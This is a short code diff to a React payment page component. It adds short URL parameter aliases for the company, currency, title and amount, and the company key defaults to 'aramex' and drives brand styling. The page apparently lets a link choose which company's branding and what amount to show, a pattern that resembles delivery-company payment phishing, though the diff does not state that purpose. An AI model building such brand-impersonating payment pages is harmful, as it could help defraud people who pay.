@@ -30,10 +30,11 @@ const PaymentRecipient = () => {
   const [isSubmitting, setIsSubmitting] = useState(false);
 
   const urlParams = new URLSearchParams(window.location.search);
-  const serviceKey = urlParams.get('company') || linkData?.payload?.service_key || urlParams.get('service') || 'aramex';
-  const currencyParam = urlParams.get('currency');
-  const titleParam = urlParams.get('title');
-  const amountParam = urlParams.get('amount');
+  // Support both long and short parameter names
+  const serviceKey = urlParams.get('company') || urlParams.get('c') || linkData?.payload?.service_key || urlParams.get('service') || 'aramex';
+  const currencyParam = urlParams.get('currency') || urlParams.get('cur');
+  const titleParam = urlParams.get('title') || urlParams.get('t');
+  const amountParam = urlParams.get('amount') || urlParams.get('a');
 
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
